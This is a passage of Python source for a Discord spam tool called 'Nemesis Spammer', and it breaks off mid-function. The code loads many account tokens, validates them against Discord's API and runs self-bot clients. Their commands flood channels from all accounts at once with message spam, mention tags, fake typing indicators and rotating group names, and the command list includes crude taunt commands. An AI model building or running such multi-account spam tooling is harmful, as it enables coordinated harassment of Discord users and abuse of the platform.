#  _   _ _____ __  __ _____ ____ ___ ____    _   _ _   _____ ___ __  __    _  _____ _____ 
# | \ | | ____|  \/  | ____/ ___|_ _/ ___|  | | | | | |_   _|_ _|  \/  |  / \|_   _| ____|
# |  \| |  _| | |\/| |  _| \___ \| |\___ \  | | | | |   | |  | || |\/| | / _ \ | | |  _|  
# | |\  | |___| |  | | |___ ___) | | ___) | | |_| | |___| |  | || |  | |/ ___ \| | | |___ 
# |_|_\_|_____|_|  |_|_____|____/___|____/___\___/|_____|_|_|___|_|  |_/_/   \_\_| |_____|
# / ___| / _ \| | | |  _ \ / ___| ____|  / ___/ _ \|  _ \| ____|                          
# \___ \| | | | | | | |_) | |   |  _|   | |  | | | | | | |  _|                            
#  ___) | |_| | |_| |  _ <| |___| |___  | |__| |_| | |_| | |___                           
# |____/ \___/ \___/|_| \_\\____|_____|  \____\___/|____/|_____|        
#                          
#                              @walkxlls // @andreikx                                                                                                                


import requests,sys,json
import discord
from discord.ext import commands, tasks
import asyncio
import multiprocessing
import time
import random
import threading
from colorama import Fore,Style
import fade
import socket
import os
import aiohttp
import subprocess
import psutil
import json
from datetime import datetime
#import tqdm
#import ctypes 
#from ctypes import windll

# script version
    
__VERSION__ = "ULTIMATE EDITION"

# start time

start_time = datetime.utcnow()

# DISCORD.PY VERSION MUST BE 1.7.3
# pip install discord.py==1.7.3
# pip install discord==1.7.3

# configure window

#ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 100)
#ASADMIN = 'asadmin'
#if sys.argv[-1] != ASADMIN:
#          script = os.path.abspath(sys.argv[0])
#          params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
#          windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
#          sys.exit(0)
#ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 100)
#GWL_STYLE = -25
#WS_MAXIMIZEBOX = 0x000100000
#WS_SIZEBOX = 0x00040000
#hwnd = ctypes.windll.kernel32.GetConsoleWindow()
#style = ctypes.windll.user32.GetWindowLongPtrW(hwnd, GWL_STYLE)
#style &= ~WS_MAXIMIZEBOX
#style &= ~WS_SIZEBOX
#ctypes.windll.user32.SetWindowLongPtrW(hwnd, GWL_STYLE, style)
#ctypes.windll.user32.DeleteMenu(hwnd, 0xF000, 0x0001)
#ctypes.windll.user32.RedrawWindow(hwnd, None, None, 0x0400 | 0x0001)
#ctypes.windll.kernel32.SetConsoleTitleW(f'Loading Nemesis Spammer.....')


# additional variables for token checking

invalid_tokens = 0
invalid_tokens_list = []

# update title

#def update_title(cv,username):
#    start_time = time.time()
#    while True:
#        try:
#            current_time = time.time()
#            elapsed_time = current_time - start_time
#            elapsed_time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
#            title = f"[Nemesis Spammer] | v{__VERSION__} | Runtime: {elapsed_time_str} | Connected: {username}"
#
#            ctypes.windll.kernel32.SetConsoleTitleW(title)
#            time.sleep(1)
#        except requests.exceptions.RequestException as e:
#            log(f"ERROR: {e}")
#            time.sleep(20)

# clear terminal logic

def clear_terminal_event(self = None):
    log("TERMINAL SUCCESFULLY CLEARED")
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    if self != None:
        print(self)

# list of commands for $comenzi

comenzi22 = ['# ------Nemesis spammer-------'
             , '**Prefix**', '! - single line spam with > #'
             , '$ - shift enter spam', '@ - custom text spam', '+ - shift enter spam with > #', '**Start commands**'
             , '!start {token} {optional tag}', '$start {token} {optional tag}', '@start {token} {custom message}'
             , '+start {token} {optional tag}', '!stop {token}', '$stop {token}'
             , '@stop {token}', '+stop {token}'
             , '**Start channel commands**', '!startchannel {token} {channel id} {optional tag}'
             , '$startchannel {token} {channel id} {optional tag}'
             , '@startchannel {token} {channel id} {custom message}'
             , '+startchannel {token} {channel id} {optional tag}', '!stopchannel {token}', '$stopchannel {token}'
             , '@stopchannel {token}', '+stopchannel {token}', '**Start all commands**', '!startall {optional tag}'
             , '$startall {optional tag}', '@startall {custom message} '
             , '+startall {optional tag}', '!stopall', '$stopall', '@stopall'
             , '+stopall', '**Delay commands**', '!delay {token} {delay}', '$delay {token} {delay}', '@delay {token} {delay}'
             , '+delay {token} {delay}', '!delayall {delay}', '$delayall {delay}', '@delayall {delay}', '+delayall {delay}'
             , '**Start notepad commands**','$startnotepad {token} {channelid}{notepad.txt} {optional tag}','$stopnotepad {token}','$startnotepadshift {token} {channel id} {notepad.txt} (STARTS NOTEPAD WITH SHIFT ENTER)','$stopnotepadshift {token}'
             , '**Typing commands**'
             , 'values = true , True , TRUE , false , False , FALSE'
             , '!typing {token} {value}', '$typing {token} {value}'
             , '@typing {token} {value}', '+typing {token} {value}'
             , '!typingall {value}', '$typingall {value}', '@typingall {value}'
             , '+typingall {value}','!size {small / Small / SMALL / big / Big / BIG}', '**Global commands**', 'values = true , True , TRUE , false , False , FALSE'
             , '%globalstart {optional tag} ', '%globalstop'
             , '%globaltyping {value}', '**Token commands**', '$tokenuser'  
             , '$tokenlist','$tokenbased {messages separated with spaces} (FIRST WORD GETS ASSIGNED TO THE FIRST TOKEN AND SO ON)','$tokenbasedstop','$addtoken {token} ( adds token to tokens.txt)'
             ,'$changegroup {token} {groupid} {messages separated with spaces} (group name will change every 1.5 seconds to every word , which is separated by spaces)'
             ,'$changegroupstop {token}', '**Fun commands**', '#gay {optional tag}', '#ship {tag}', '#call {tag}'
             , '#pula {tag}','#say {token} {message}','#sayid {token} {channelid} {message}','#afkcheck {token} {number}'
             ,'#afkcheckstop {token}','!av {tag / id } (ONLY WORKS IN SERVERS)'
             ,'!banner {tag / id} (ONLY WORKS IN SERVERS)','#binary {text} (GETS BINARY VALUE TO A STRING)','#finduser {username} (DISPLAYS THE LIST INDEX OF AN USERNAME IF IN TOKEN LIST)'
             ,'#validate {token} (CHECKS IF A TOKEN IS VALID OR NOT)','#saytoken {discordtoken} {message}','#saytokenid {discordtoken} {channelid} {message}','#userid {id} (RETURNS USERNAME OF AN ID)'
             ,'**Streaming commands**', '+stream {stream text}'
             , '+streamtoken {token} {stream text}','+streamall {stream text}']

# get commands from list for $comenzi commnad

with open("comenzi.txt",'w') as file:
        file.write(f"")
for i in comenzi22:
    with open("comenzi.txt",'a') as file:
        file.write(f"{i}\n")

# set main ascii text

text = """
 __    __  ________  __       __  ________   ______   ______   ______          ______   _______    ______   __       __  __       __  ________  _______  
/  \  /  |/        |/  \     /  |/        | /      \ /      | /      \        /      \ /       \  /      \ /  \     /  |/  \     /  |/        |/       \ 
$$  \ $$ |$$$$$$$$/ $$  \   /$$ |$$$$$$$$/ /$$$$$$  |$$$$$$/ /$$$$$$  |      /$$$$$$  |$$$$$$$  |/$$$$$$  |$$  \   /$$ |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |
$$$  \$$ |$$ |__    $$$  \ /$$$ |$$ |__    $$ \__$$/   $$ |  $$ \__$$/       $$ \__$$/ $$ |__$$ |$$ |__$$ |$$$  \ /$$$ |$$$  \ /$$$ |$$ |__    $$ |__$$ |
$$$$  $$ |$$    |   $$$$  /$$$$ |$$    |   $$      \   $$ |  $$      \       $$      \ $$    $$/ $$    $$ |$$$$  /$$$$ |$$$$  /$$$$ |$$    |   $$    $$< 
$$ $$ $$ |$$$$$/    $$ $$ $$/$$ |$$$$$/     $$$$$$  |  $$ |   $$$$$$  |       $$$$$$  |$$$$$$$/  $$$$$$$$ |$$ $$ $$/$$ |$$ $$ $$/$$ |$$$$$/    $$$$$$$  |
$$ |$$$$ |$$ |_____ $$ |$$$/ $$ |$$ |_____ /  \__$$ | _$$ |_ /  \__$$ |      /  \__$$ |$$ |      $$ |  $$ |$$ |$$$/ $$ |$$ |$$$/ $$ |$$ |_____ $$ |  $$ |
$$ | $$$ |$$       |$$ | $/  $$ |$$       |$$    $$/ / $$   |$$    $$/       $$    $$/ $$ |      $$ |  $$ |$$ | $/  $$ |$$ | $/  $$ |$$       |$$ |  $$ |
$$/   $$/ $$$$$$$$/ $$/      $$/ $$$$$$$$/  $$$$$$/  $$$$$$/  $$$$$$/         $$$$$$/  $$/       $$/   $$/ $$/      $$/ $$/      $$/ $$$$$$$$/ $$/   $$/ 
                          """

# set loading ascii text
                          
loading = """
  _      ____          _____ _____ _   _  _____       
 | |    / __ \   /\   |  __ \_   _| \ | |/ ____|      
 | |   | |  | | /  \  | |  | || | |  \| | |  __       
 | |   | |  | |/ /\ \ | |  | || | | . ` | | |_ |      
 | |___| |__| / ____ \| |__| || |_| |\  | |__| |_ _ _ 
 |______\____/_/    \_\_____/_____|_| \_|\_____(_|_|_)
                          """

# load animations

def loading_animation():
 l = ['|', '/', '-', '\\']
 for i in l + l + l:
    sys.stdout.write(f'\r[\x1b[95m+\x1b[95m\x1b[37m] Preparing packages... [{i}]')
    sys.stdout.flush()
    time.sleep(0.2)
if __name__ == "__main__":
    print(fade.water(loading))
    print("\n")
    loading_animation()
    os.system('cls' if os.name == 'nt' else 'clear') # clear terminal

# check and sort tokens from tokens.txt

def check_all_tokens(token):
    global invalid_tokens
    headers = {
        'Authorization': token
    }
    
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)

    if response.status_code == 200:
        user_info = response.json()
        return user_info['username']
    else:
        invalid_tokens += 1
        invalid_tokens_list.append(token)
        return None

with open('tokens.txt', 'r') as file:
    tokens_to_check = [line.strip() for line in file]

valid_tokens_with_users = []

for token in tokens_to_check:
    username = check_all_tokens(token)
    if username:
        valid_tokens_with_users.append((token, username))

# get usernames from valid tokens

account_number = 0

with open('usernames.txt', 'w') as valid_with_users_file:
    for token, username in valid_tokens_with_users:
        account_number += 1
        valid_with_users_file.write(f'{account_number}. {username}\n')
        
with open('usernames2.txt', 'w') as valid_with_users_file:
    for token, username in valid_tokens_with_users:
        valid_with_users_file.write(f'{username}\n')

with open('valid_tokens.txt', 'w') as valid_without_users_file:
    for token, _ in valid_tokens_with_users:
        valid_without_users_file.write(f'{token}\n')    
        
# main token variable

token_index = open("tokens.txt",'r').read().splitlines()
token = token_index[0]

# extra variables

found = False
x = 0
mt = 0

# check new main token  

def new_main_token_validation(newtoken1):
    verification_header = {"authorization":newtoken1} 
    response = requests.get('https://discord.com/api/v10/users/@me',headers=verification_header)
    if response.status_code == 200:
        return newtoken1
    else:
        return None

# check main token

def main_token_validation():
 global found
 verification_header = {"authorization":token}
 response = requests.get('https://discord.com/api/v10/users/@me',headers=verification_header)
 if response.status_code == 200:
     log("MAIN TOKEN SUCCESFULLY VALIDATED")
     print(f"{Fore.GREEN}Main token succesfully validated{Style.RESET_ALL}")
     return token
 else:
     log("INVALID MAIN TOKEN")
     print(F"{Fore.RED}Main token is invalid\nExiting the script.......{Style.RESET_ALL}")
     x = input(f"{Fore.YELLOW}Replace main token? (y/n) {Style.RESET_ALL}").lower()
     if x not in ['y','n']:
         log("INVALID INPUT FOR REPLACE TOKEN")
         log("EXITING SCRIPT::::INPUT ERROR")
         print("Invalid input")
         sys.exit()
     if x == "y":
        while True:
         new_token = input(f"{Fore.YELLOW}enter new token: {Style.RESET_ALL}")
         x = new_main_token_validation(new_token)
         if x == None:
             log("INVALID TOKEN ENTERED.....CONTINUING")
             print(f"{Fore.RED}Invalid token...{Style.RESET_ALL}")
             continue
         else:
          log("NEW MAIN TOKEN SUCCESFULLY VALIDATED")
          clear_terminal_event()
          print(fade.fire(text))
          print(f"{Fore.GREEN}Main token succesfully validated{Style.RESET_ALL}")
          return x
     if x == "n":
      log("MAIN TOKEN INVALID:::USER INPUT==N")
      log("EXITING SCRIPT::::NO ERRROR")
      print(f"{Fore.RED}Exiting the script...{Style.RESET_ALL}")
      time.sleep(1.5)
      sys.exit()
 main_token_checker = open("valid_tokens.txt",'r').read().splitlines()
 for i in main_token_checker:
     if token == i:
      log("MAIN TOKEN FOUND IN TOKENS.TXT")
      print(f"{Fore.GREEN}Main token found in tokens.txt{Style.RESET_ALL}")
      found = True
 if found == False:
     log("MAIN TOKEN NOT FOUND IN TOKENS.TXT")
     print(f"{Fore.YELLOW}Main token not found in tokens.txt{Style.RESET_ALL}")
     
# file checking for script

def load_messages(file_name):
    with open(file_name, 'r') as file:
        return file.read().splitlines()
def load_messages2(file_name):
    with open(file_name, 'r',encoding="UTF-8") as icesugepula:
        return icesugepula.read().split('\n\n')
# main token username

def discord_username(token):
    headers = {"Authorization":token}
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    if response.status_code == 200:
        user_info = response.json()
        return user_info['username']

# variables for script

tokens = open('valid_tokens.txt','r').read().splitlines() 
tokens2 = open('valid_tokens.txt','r').read().splitlines()  
tokens3 = open('valid_tokens.txt','r').read().splitlines()
tokens4 = open('valid_tokens.txt','r').read().splitlines() 
tokens5 = open('valid_tokens.txt','r').read().splitlines() 
tokens6 = open('valid_tokens.txt','r').read().splitlines()    
#----------------------------------------------------
tokensdelay1 = open('valid_tokens.txt','r').read().splitlines() 
tokensdelay2 = open('valid_tokens.txt','r').read().splitlines()  
tokensdelay3 = open('valid_tokens.txt','r').read().splitlines() 
tokensdelay4 = open('valid_tokens.txt','r').read().splitlines() 
#---------------------------------------------
tokenstyping1 = open('valid_tokens.txt','r').read().splitlines() 
tokenstyping2 = open('valid_tokens.txt','r').read().splitlines() 
tokenstyping3 = open('valid_tokens.txt','r').read().splitlines() 
tokenstyping4 = open('valid_tokens.txt','r').read().splitlines()
#-----------------------------------------------
tokenschannel1 = open('valid_tokens.txt','r').read().splitlines() 
tokenschannel2 = open('valid_tokens.txt','r').read().splitlines() 
tokenschannel3 = open('valid_tokens.txt','r').read().splitlines() 
tokenschannel4 = open('valid_tokens.txt','r').read().splitlines() 
#------------------------------------------
tokensglobaltyping = open('valid_tokens.txt','r').read().splitlines()
#-------------------------------------------
tokensstreaming = open('valid_tokens.txt','r').read().splitlines() 
#---------------------------------------
tokenstreams = open('valid_tokens.txt','r').read().splitlines() 
#--------------------------------------
big_text = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------------
tokens_notepad = open('valid_tokens.txt','r').read().splitlines()
tokens_notepad2 = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------------
tokens_afkcheck= open('valid_tokens.txt','r').read().splitlines()
tokens_afkcheck2 = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------------
tokensreact = open('valid_tokens.txt','r').read().splitlines()  
#--------------------------------------
tokensbased = open('valid_tokens.txt','r').read().splitlines()
tokensbased2 = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------------
tokensgroup = open('valid_tokens.txt','r').read().splitlines()
tokensgroup2 = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------
tokensfast = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------
tokensreply = open('valid_tokens.txt','r').read().splitlines() 
tokenreplydelay = open('valid_tokens.txt','r').read().splitlines() 
tokenreplydelay[0] = 5
#---------------------------
tokensreplyafk = open('valid_tokens.txt','r').read().splitlines()
tokensreplyafk2 = open('valid_tokens.txt','r').read().splitlines()
tokensreplyafk3 = open('valid_tokens.txt','r').read().splitlines()
tokensreplyafk4 = open('valid_tokens.txt','r').read().splitlines()
tokensreplyaux = open('valid_tokens.txt','r').read().splitlines()
#-----------------------------------
copymessagetoken = open('valid_tokens.txt','r').read().splitlines()
copymessagetoken2 = open('valid_tokens.txt','r').read().splitlines()
#-----------------------------------
tokensaddgroup = open('valid_tokens.txt','r').read().splitlines()
tokensaddgroup2 = open('valid_tokens.txt','r').read().splitlines()
#--------------------------------------
copymessagetokenid = open('valid_tokens.txt','r').read().splitlines()
copymessagetokenid2 = open('valid_tokens.txt','r').read().splitlines()
#-------------------------------------
tokenspreset = open('valid_tokens.txt','r').read().splitlines() 
tokenspreset2 = open('valid_tokens.txt','r').read().splitlines()
#------------------------------------
copymessagetokenid3 = open('valid_tokens.txt','r').read().splitlines()
copymessagetokenid4 = open('valid_tokens.txt','r').read().splitlines()
#-----------------------------------
customreacttoken = open('valid_tokens.txt','r').read().splitlines()
customreacttoken2 = open('valid_tokens.txt','r').read().splitlines()
#-----------------------------------
tokenscountdown = open('valid_tokens.txt','r').read().splitlines()
tokenscountdownnotepad = open('valid_tokens.txt','r').read().splitlines()
#--------------------
editmessage = open('valid_tokens.txt','r').read().splitlines()
#-------------------
data2000 = {}
mt = {}
for i in range(len(tokens)+1):
    mt[i] = []
with open('status.json','w') as file:
  json.dump(mt,file,indent=4)

# update uptime

def get_uptime():
    current_time = datetime.utcnow()
    uptime_delta = current_time - start_time
    days = uptime_delta.days
    hours, remainder = divmod(uptime_delta.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{days} days, {hours} hours, {minutes} minutes, {seconds} seconds"
    return uptime_str
    
# check for internet connection

def check_internet_connection():
    try:
        socket.create_connection(("www.google.com", 80), timeout=2)
        return True
    except OSError:
        return False

# create log text file

with open("log.txt",'w') as file:
    file.write(f"")

# log message logic

def log(message):
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
     log_message = f"[{timestamp}] {message}"
    
     with open("log.txt", "a") as log_file:
         log_file.write(log_message + "\n")

#check for internet

check_internet_connection()
if not check_internet_connection:
    log("NO INTERNET CONNECTION")
    log("EXITING SCRIPT:::: FATAL ERROR")
    print(f"{Fore.RED}No internet connection....{Style.RESET_ALL}")
    sys.exit()

# clear log 

def clear_log_file():
    file_path = "log.txt"
    try:
        with open(file_path, 'w') as file:
            file.truncate(0)
    except IOError as e:
        print(f"Error: {e}")
    
# set intents

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

# set client prefix

single_line_prefix = '!'
multi_line_prefix = '$'
repeated_spam_prefix = '@'
spiced_spam_prefix = '+'
streaming_prefix = '+'
glumite_prefix = '#'
globale_prefix = '%'

list_of_prefixes = [single_line_prefix,multi_line_prefix,repeated_spam_prefix,spiced_spam_prefix,streaming_prefix,glumite_prefix,globale_prefix]

# initialize clients

client_single_line_spam = commands.Bot(command_prefix=single_line_prefix, self_bot=True, intents=intents)
client_multi_line_spam = commands.Bot(command_prefix=multi_line_prefix, self_bot=True, intents=intents)
client_repeated_message_spam = commands.Bot(command_prefix=repeated_spam_prefix, self_bot=True, intents=intents)
client_spiced_multi_line_spam = commands.Bot(command_prefix=spiced_spam_prefix, self_bot=True, intents=intents)
client_streaming = commands.Bot(command_prefix=streaming_prefix,self_bot=True,intents=intents)
client_pentru_glumite = commands.Bot(command_prefix=glumite_prefix,self_bot=True,intents=intents)
client_pentru_globale = commands.Bot(command_prefix=globale_prefix,self_bot=True,intents=intents)
client_pentru_mesaje = commands.Bot(command_prefix="*",self_bot=True,intents=intents)



# set delays

for i in range(len(tokens)):
    tokensdelay1[i] = 5
    tokensdelay2[i] = 5
    tokensdelay3[i] = 5
    tokensdelay4[i] = 5

# set notepads names

single_line_spam_notepad = 'test.txt'
multi_line_spam_notepad =  'test2.txt'
spiced_multi_line_spam_notepad = 'test3.txt'

# read script spam notepads

with open(single_line_spam_notepad, 'r',encoding="utf8") as file:
    single_line_spam_messages = file.read().splitlines()

with open(multi_line_spam_notepad, 'r',encoding="utf8") as file:
    multi_line_spam_messages = file.read().split('\n\n')
    
with open(spiced_multi_line_spam_notepad, 'r',encoding="utf8") as file:
    spiced_multi_line_spam_messages = file.read().split('\n\n')

# read usernames for $tokenuser command
    
with open('usernames.txt', 'r',encoding="utf8") as file:
    usernameuri = file.read().split('\n\n')  

# read notepad for $comenzi command
    
with open('comenzi.txt', 'r',encoding="utf8") as file:
    comendute = file.read().split('\n\n') 

# send messages scripts + include ratelimit

#single line spam 
async def send_with_retry(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        exit()
    while tokens[count] == True:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping1[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#single line spam 
async def send_with_retrychannel(ctx, message, delay,count,canalid):
    global mt
    ceva = True
    count = int(count)
    if tokenschannel1[count] == False:
        exit()
    while tokenschannel1[count] == True:
     if tokenschannel1[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping1[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canalid}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canalid}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#single line spam 
def send_with_retry_startall(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    canal = ctx.channel.id
    while tokens3[1]:
     for message in single_line_spam_messages:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"> # {message} {mentions}"} 
        if not tokens3[1]:
         exit()
        try:
            if tokensglobaltyping[0] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
            requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                          ,headers=headers
                          ,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

# fast start all

async def send_with_retry_fast_start_all(ctx, message, count):
    count = int(count)
    while tokensfast[0]:
        try:
            json_payload = {"content": message}
            headers = {"authorization": tokens2[count]}
            async with aiohttp.ClientSession() as session:
                if tokenstyping1[count]:
                    async with session.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing", headers=headers) as resp:
                        pass 
                async with session.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/messages", headers=headers, json=json_payload) as resp:
                    pass
                break  
        except aiohttp.ClientResponseError as err:
            print(f"HTTP Error: {err}")
        except aiohttp.ClientConnectorError as errc:
            print(f"Error Connecting: {errc}")
        except asyncio.TimeoutError as errt:
            print(f"Timeout Error: {errt}")
        except Exception as e:
            print(e)
        await asyncio.sleep(tokensdelay1[0])

#multi line spam 
async def send_with_retry2(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokenschannel1[count] == False:
        exit()
    while tokenschannel1[count]:
     if tokenschannel1[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping2[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#multi line spam 
async def send_with_retrychannel2(ctx, message, delay,count,canalid):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        exit()
    while tokens[count]:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping2[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canalid}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canalid}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#multi line spam
def send_with_retry_startall2(ctx,mentions):
    mentions = ' '.join([mention.mention for mention in mentions])
    canal = ctx.channel.id
    while tokens4[1]:
     for message in multi_line_spam_messages:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":f"{message} {mentions}"} 
        if not tokens4[1]:
         exit()
        try:
            if tokensglobaltyping[0] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
            requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                          ,headers=headers
                          ,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

#repeated message spam
async def send_with_retry3(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:
        return
    while tokens[count]:
     if tokens[count] == False:
      return
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping3[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#repeated message spam
async def send_with_retrychannel3(ctx, message,  delay,count,canalid):
    global mt
    ceva = True
    count = int(count)
    if tokenschannel1[count] == False:
        return
    while tokenschannel1[count]:
     if tokenschannel1[count] == False:
      return
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping3[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canalid}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{canalid}/messages'
                       ,headers=headers
                       ,json=json)
         break  # Message sent successfully, exit retry loop
     except requests.exceptions.HTTPError as errh:
         print(f"HTTP Error: {errh}")
         time.sleep(5)
         continue
     except requests.exceptions.ConnectionError as errc:
         print(f"Error Connecting: {errc}")
         time.sleep(5)
         continue
     except requests.exceptions.Timeout as errt:
         print(f"Timeout Error: {errt}")
         time.sleep(5)
         continue
     except requests.exceptions.RequestException as err:
         print(f"Request Exception: {err}")
         time.sleep(5)
         continue
     except Exception as e:
         print(e)
         time.sleep(5)
         continue

#repeated message spam
def send_with_retry_startall3(ctx,message):
    canal = ctx.channel.id
    while tokens5[1]:
      for i in tokens2:
        if i == token:
            continue
        headers = {"authorization":i}
        json = {"content":message} 
        if not tokens5[1]:
         exit()
        try:
            if tokensglobaltyping[0] == True:
             requests.post(f"https://discord.com/api/v10/channels/{canal}/typing"
                           ,headers=headers)
            requests.post(f'https://discord.com/api/v10/channels/{canal}/messages'
                          ,headers=headers
                          ,json=json)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTP Error: {errh}")
            time.sleep(5)
            continue
        except requests.exceptions.ConnectionError as errc:
            print(f"Error Connecting: {errc}")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout as errt:
            print(f"Timeout Error: {errt}")
            time.sleep(5)
            continue
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            time.sleep(5)
            continue
        except Exception as e:
            print(e)
            time.sleep(5)
            continue

#spiced up line spam
async def send_with_retry4(ctx, message, delay,count):
    global mt
    ceva = True
    count = int(count)
    if tokens[count] == False:  
        exit()
    while tokens[count]:
     if tokens[count] == False:
      exit()
     try:
         json = {"content":message} 
         headers = {"authorization":tokens2[count]}
         if tokenstyping4[count] == True:
             requests.post(f"https://discord.com/api/v10/channels/{ctx.channel.id}/typing"
                           ,headers=headers)
         requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                       ,headers=headers,json=json)
